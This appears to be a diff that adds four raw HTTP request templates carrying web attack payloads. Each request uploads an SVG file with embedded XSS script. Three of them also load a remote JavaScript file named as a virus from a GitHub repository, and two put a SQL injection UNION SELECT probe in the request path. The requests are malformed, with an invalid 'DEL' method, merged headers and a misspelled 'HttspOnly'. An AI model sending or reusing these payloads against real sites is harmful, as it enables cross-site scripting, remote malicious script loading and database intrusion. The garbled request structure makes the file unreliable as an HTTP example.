@@ -1,0 +1,78 @@
+GET / HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate 
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7    
+Keep-Alive: 115
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=-----------H1PaOVp9eJByVoSrSRwZ5WIX6sXVz9
+Content-Length: 1761
+Cookie: cookiesession1=678B2884F7EAD14E185E497C7A6C1597; Expires=Tue, 25 Feb 2025 09:34:36 GMT; Path=/; HttpOnly
+Set-Cookie: cookiesession1=678B2884F7EAD14E185E497C7A6C1597;Expires=Tue, 25 Feb 2025 09:34:36 GMT;Path=/;HttspOnly
+Upgrade-Insecure-Requests: 100
+Content-Disposition: form-data; name="m1_files[]"; filename="SVG_XSS.svg"
+Content-Type: image/svg+xml
+<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Files/SVG_XSS.svg">
+<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+<script type="text/javascript">alert(document.domain);</script></svg>
+
+PUT / HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 115
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=-----------H1PaOVp9eJByVoSrSRwZ5WIX6sXVz9
+Content-Length: 1761
+Cookie: cookiesession1=678B2884F7EAD14E185E497C7A6C1597; Expires=Tue, 25 Feb 2025 09:34:36 GMT; Path=/; HttpOnly
+Set-Cookie: cookiesession1=678B2884F7EAD14E185E497C7A6C1597;Expires=Tue, 25 Feb 2025 09:34:36 GMT;Path=/;HttspOnly
+Upgrade-Insecure-Requests: 100
+Content-Disposition: form-data; name="m1_files[]"; filename="SVG_XSS.svg"
+<script type="text/javascript" src="https://raw.githubusercontent.com/NaInSec/NaInSec_JSVirus/main/NaInSec_Virus.js?raw=true"></script>
+Content-Type: image/svg+xml
+<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Files/SVG_XSS.svg">
+<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+<script type="text/javascript">alert(document.domain);</script></svg>
+
+DEL /' UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8                             Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 115
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=-----------H1PaOVp9eJByVoSrSRwZ5WIX6sXVz9
+Content-Length: 1761
+Cookie: cookiesession1=678B2884F7EAD14E185E497C7A6C1597; Expires=Tue, 25 Feb 2025 09:34:36 GMT; Path=/; HttpOnly
+Set-Cookie: cookiesession1=678B2884F7EAD14E185E497C7A6C1597;Expires=Tue, 25 Feb 2025 09:34:36 GMT;Path=/;HttspOnly
+Upgrade-Insecure-Requests: 100
+Content-Disposition: form-data; name="m1_files[]"; filename="SVG_XSS.svg"
+<script type="text/javascript" src="https://raw.githubusercontent.com/NaInSec/NaInSec_JSVirus/main/NaInSec_Virus.js?raw=true"></script>
+Content-Type: image/svg+xml
+<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Files/SVG_XSS.svg">
+<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+<script type="text/javascript">alert(document.domain);</script></svg>
+
+POST /' UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8                             Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 115
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=-----------H1PaOVp9eJByVoSrSRwZ5WIX6sXVz9
+Content-Length: 1761
+Cookie: cookiesession1=678B2884F7EAD14E185E497C7A6C1597; Expires=Tue, 25 Feb 2025 09:34:36 GMT; Path=/; HttpOnly
+Set-Cookie: cookiesession1=678B2884F7EAD14E185E497C7A6C1597;Expires=Tue, 25 Feb 2025 09:34:36 GMT;Path=/;HttspOnly
+Upgrade-Insecure-Requests: 100
+Content-Disposition: form-data; name="m1_files[]"; filename="SVG_XSS.svg"
+<script type="text/javascript" src="https://raw.githubusercontent.com/NaInSec/NaInSec_JSVirus/main/NaInSec_Virus.js?raw=true"></script>
+Content-Type: image/svg+xml
+<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Files/SVG_XSS.svg">
+<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+<script type="text/javascript">alert(document.domain);</script></svg>
